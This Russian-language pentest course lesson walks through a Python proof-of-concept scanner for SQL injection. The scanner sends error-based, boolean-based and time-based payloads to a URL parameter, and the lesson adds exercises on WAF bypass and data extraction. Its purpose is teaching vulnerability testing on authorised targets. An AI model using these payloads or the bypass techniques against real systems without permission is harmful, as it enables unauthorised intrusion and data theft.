# Занятие 43: Написание PoC — скрипт проверки SQL-инъекции

## Теория

**PoC (Proof of Concept)** — это скрипт или метод, демонстрирующий возможность эксплуатации уязвимости. В пентесте PoC используется для подтверждения того, что уязвимость реальна и может быть использована злоумышленником.

**SQL-инъекция** — это уязвимость, позволяющая внедрить произвольный SQL-код в запрос к базе данных. Она возникает при некорректной обработке пользовательского ввода.

**Типы SQL-инъекций:**
- **Classic (In-band):** результаты видны сразу в ответе
- **Blind (Слепая):** результаты не видны напрямую, нужно анализировать косвенные признаки
- **Time-based:** основана на задержках в ответе БД
- **Out-of-band:** использует внешние каналы (DNS, HTTP)

**Библиотеки:**
- `requests` — для отправки HTTP-запросов
- `re` — для парсинга ответов (регулярные выражения)
- `time` — для time-based проверок

**Установка:**
```bash
pip install requests
```

## Практическое занятие

Напишем PoC для проверки SQL-инъекции в параметре ID (GET-запрос).

```python
import requests
import time
import re
from urllib.parse import urljoin

class SQLiChecker:
    """Класс для проверки SQL-инъекций"""
    
    def __init__(self, target_url, params=None):
        """
        Инициализация
        :param target_url: целевой URL
        :param params: словарь параметров (например, {'id': '1'})
        """
        self.target_url = target_url
        self.params = params or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerable = False
        self.evidence = []
    
    def check_error_based(self, param_name, payloads=None):
        """
        Проверка на error-based SQL-инъекцию
        :param param_name: имя параметра для проверки
        :param payloads: список пейлоадов (если None, используются стандартные)
        """
        if payloads is None:
            payloads = [
                "'",
                '"',
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1--",
                '" OR 1=1--',
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
            ]
        
        print(f"\n[+] Проверка error-based SQL-инъекции в параметре '{param_name}'...")
        
        # Сначала получаем базовый ответ (без инъекции)
        try:
            base_response = self.session.get(self.target_url, params=self.params, timeout=10)
            base_content = base_response.text
            base_length = len(base_content)
        except Exception as e:
            print(f"[-] Ошибка получения базового ответа: {e}")
            return False
        
        # Регулярные выражения для поиска ошибок БД
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"PG::SyntaxError",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"ORA-[0-9]{5}",
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark after the character string",
            r"you have an error in your SQL syntax",
        ]
        
        for payload in payloads:
            test_params = self.params.copy()
            test_params[param_name] = payload
            
            try:
                response = self.session.get(self.target_url, params=test_params, timeout=10)
                content = response.text
                
                # Проверяем на наличие ошибок БД в ответе
                for pattern in error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ!")
                        print(f"         Пейлоад: {payload}")
                        print(f"         Паттерн: {pattern}")
                        self.vulnerable = True
                        self.evidence.append({
                            'type': 'error-based',
                            'param': param_name,
                            'payload': payload,
                            'pattern': pattern
                        })
                        return True
                
                # Проверяем разницу в длине ответа (индикатор изменения поведения)
                if abs(len(content) - base_length) > 100:
                    print(f"    [+] Подозрительное изменение длины ответа при пейлоаде: {payload}")
                    print(f"         Базовая длина: {base_length}, текущая: {len(content)}")
                
            except Exception as e:
                print(f"    [-] Ошибка при проверке пейлоада '{payload}': {e}")
        
        print(f"    [-] Error-based SQL-инъекция не обнаружена")
        return False
    
    def check_boolean_based(self, param_name):
        """
        Проверка на boolean-based blind SQL-инъекцию
        :param param_name: имя параметра
        """
        print(f"\n[+] Проверка boolean-based blind SQL-инъекции в параметре '{param_name}'...")
        
        # Тестовые пары: (условие истина, условие ложь)
        test_pairs = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ('" AND 1=1--', '" AND 1=2--'),
            ("1' AND '1'='1", "1' AND '1'='2"),
        ]
        
        for true_cond, false_cond in test_pairs:
            test_params_true = self.params.copy()
            test_params_true[param_name] = true_cond
            
            test_params_false = self.params.copy()
            test_params_false[param_name] = false_cond
            
            try:
                resp_true = self.session.get(self.target_url, params=test_params_true, timeout=10)
                resp_false = self.session.get(self.target_url, params=test_params_false, timeout=10)
                
                # Сравниваем ответы
                if resp_true.status_code != resp_false.status_code:
                    print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ (разница в кодах ответа)!")
                    print(f"         True: {true_cond} -> {resp_true.status_code}")
                    print(f"         False: {false_cond} -> {resp_false.status_code}")
                    self.vulnerable = True
                    self.evidence.append({
                        'type': 'boolean-based',
                        'param': param_name,
                        'true_payload': true_cond,
                        'false_payload': false_cond
                    })
                    return True
                
                if abs(len(resp_true.text) - len(resp_false.text)) > 50:
                    print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ (разница в длине ответа)!")
                    print(f"         True: {true_cond} -> длина {len(resp_true.text)}")
                    print(f"         False: {false_cond} -> длина {len(resp_false.text)}")
                    self.vulnerable = True
                    return True
                
            except Exception as e:
                print(f"    [-] Ошибка: {e}")
        
        print(f"    [-] Boolean-based SQL-инъекция не обнаружена")
        return False
    
    def check_time_based(self, param_name, delay=5):
        """
        Проверка на time-based blind SQL-инъекцию
        :param param_name: имя параметра
        :param delay: ожидаемая задержка в секундах
        """
        print(f"\n[+] Проверка time-based blind SQL-инъекции в параметре '{param_name}'...")
        
        time_payloads = [
            f"1 AND SLEEP({delay})",
            f"1' AND SLEEP({delay})--",
            f"' AND SLEEP({delay})--",
            f"1;WAITFOR DELAY '0:0:{delay}'",
            f"1' AND BENCHMARK(5000000,MD5('test'))--",
        ]
        
        for payload in time_payloads:
            test_params = self.params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                response = self.session.get(self.target_url, params=test_params, timeout=delay+10)
                elapsed = time.time() - start_time
                
                if elapsed >= delay:
                    print(f"    [!!!] НАЙДЕНА УЯЗВИМОСТЬ (задержка {elapsed:.2f} сек)!")
                    print(f"         Пейлоад: {payload}")
                    self.vulnerable = True
                    self.evidence.append({
                        'type': 'time-based',
                        'param': param_name,
                        'payload': payload,
                        'delay': elapsed
                    })
                    return True
                else:
                    print(f"    [+] Пейлоад: {payload} -> задержка {elapsed:.2f} сек (норма)")
                
            except requests.exceptions.Timeout:
                print(f"    [+] Пейлоад: {payload} -> таймаут (возможно, уязвимость)")
            except Exception as e:
                print(f"    [-] Ошибка: {e}")
        
        print(f"    [-] Time-based SQL-инъекция не обнаружена")
        return False
    
    def run_all_checks(self, param_name):
        """Запуск всех проверок"""
        print(f"\n{'='*60}")
        print(f"Проверка SQL-инъекций для {self.target_url}")
        print(f"Параметр: {param_name}")
        print(f"{'='*60}")
        
        self.check_error_based(param_name)
        if not self.vulnerable:
            self.check_boolean_based(param_name)
        if not self.vulnerable:
            self.check_time_based(param_name)
        
        print(f"\n{'='*60}")
        if self.vulnerable:
            print("РЕЗУЛЬТАТ: Обнаружена SQL-инъекция!")
            print("Детали:")
            for ev in self.evidence:
                print(f"  - Тип: {ev['type']}")
                print(f"    Параметр: {ev['param']}")
        else:
            print("РЕЗУЛЬТАТ: SQL-инъекция не обнаружена")
        print(f"{'='*60}\n")

if __name__ == "__main__":
    # Пример использования (тестовый сайт с уязвимостью)
    # В реальном пентесте используйте только на разрешенных целях!
    
    # Для тестирования можно использовать:
    # - http://testphp.vulnweb.com/ (легальный тестовый сайт)
    # - Свою локальную уязвимую лабораторию
    
    target = "http://testphp.vulnweb.com/artists.php"
    params = {"artist": "1"}
    
    checker = SQLiChecker(target, params)
    checker.run_all_checks("artist")
```

**Объяснение кода:**
1. Класс `SQLiChecker` инкапсулирует всю логику проверки
2. `check_error_based()` — ищет ошибки БД в ответе (самый очевидный тип)
3. `check_boolean_based()` — сравнивает ответы при истинном и ложном условиях
4. `check_time_based()` — измеряет время ответа при использовании функций задержки
5. Используются регулярные выражения для поиска типичных ошибок БД

**Важно:** Запускайте только на системах, на которые у вас есть разрешение!

## Примеры вывода

Пример успешного обнаружения SQL-инъекции:

```
============================================================
Проверка SQL-инъекций для http://testphp.vulnweb.com/artists.php
Параметр: artist
============================================================

[+] Проверка error-based SQL-инъекции в параметре 'artist'...
    [!!!] НАЙДЕНА УЯЗВИМОСТЬ!
         Пейлоад: ' OR 1=1--
         Паттерн: you have an error in your SQL syntax

============================================================
РЕЗУЛЬТАТ: Обнаружена SQL-инъекция!
Детали:
  - Тип: error-based
    Параметр: artist
============================================================
```

## Частые ошибки

1. **`NameError: name 'urllib3' is not defined`** — В файле lesson_42 уже исправлен импорт, но если переносите код, убедитесь, что добавили `import urllib3`.
2. **Ложноположительные срабатывания** — Некоторые пейлоады могут вызывать ошибки, не связанные с SQL-инъекцией. Всегда проверяйте несколько раз и анализируйте контекст.
3. **WAF блокировка** — Современные WAF могут блокировать запросы с подозрительными параметрами. Используйте обфускацию и ротацию User-Agent.
4. **`requests.exceptions.Timeout`** — При проверке time-based инъекций увеличьте таймаут, так как некоторые запросы могут выполняться долго.

## Вопросы на понимание

1. **В чем разница между error-based и blind SQL-инъекцией?**
   <details>
   <summary>Ответ</summary>
   Error-based возвращает явную ошибку БД в ответе, которую можно увидеть сразу. Blind (слепая) инъекция не возвращает данные напрямую, и нужно анализировать косвенные признаки (время ответа, изменение содержимого).
   </details>

2. **Зачем нужны три разных метода проверки (error, boolean, time)?**
   <details>
   <summary>Ответ</summary>
   Разные цели могут быть уязвимы только к определенным типам инъекций. Error-based самый быстрый, но его легко заметить. Boolean-based сложнее обнаружить. Time-based работает даже когда нет видимого результата, но медленнее всех.
   </details>

3. **Почему в коде используется `session` вместо простого `requests.get()`?**
   <details>
   <summary>Ответ</summary>
   Session сохраняет куки и заголовки между запросами. Это важно, если цель требует предварительной авторизации или использует сессии для отслеживания state.
   </details>

## Задачи для самостоятельного выполнения

1. **POST-запросы:** Расширьте класс для проверки SQL-инъекций в POST-параметрах (не только GET).

2. **Cookie и заголовки:** Добавьте возможность проверки инъекций в куки и HTTP-заголовках (User-Agent, Referer и т.д.).

3. **Автоматическое определение БД:** Добавьте логику определения типа базы данных (MySQL, PostgreSQL, MSSQL, SQLite) на основе ошибок и специфичных для БД пейлоадов.

4. **Извлечение данных:** Напишите функцию, которая после обнаружения уязвимости пытается извлечь версию БД или имя текущей базы данных.

5. **WAF обход:** Добавьте варианты пейлоадов для обхода WAF (Web Application Firewall):
   - Использование комментариев: `/**/`
   - Обфускация ключевых слов: `SeLeCt`, `UnIoN`
   - Использование альтернативных кодировок

6. **Отчет:** Создайте метод `generate_report()`, который сохраняет результаты проверки в JSON-файл с подробным описанием уязвимости.

7. **Интеграция с sqlmap:** Добавьте возможность запуска sqlmap через subprocess для подтверждения и глубокого исследования найденной уязвимости.

## Адаптация под macOS (M2, 8GB)

При выполнении заданий на компьютере Mac с процессором M2 и 8GB оперативной памяти учитывайте следующие особенности:

- Для установки библиотек используйте `pip3 install <package>`, а не `pip install`.
- На M2 можно использовать `asyncio`, он поддерживает ARM.
- На 8GB RAM проект может быть тяжелым, используйте легковесные библиотеки.
- Для работы с aiohttp в будущих уроках используйте `connector = aiohttp.TCPConnector(ssl=False)` вместо передачи `ssl=False` напрямую в `get()`.
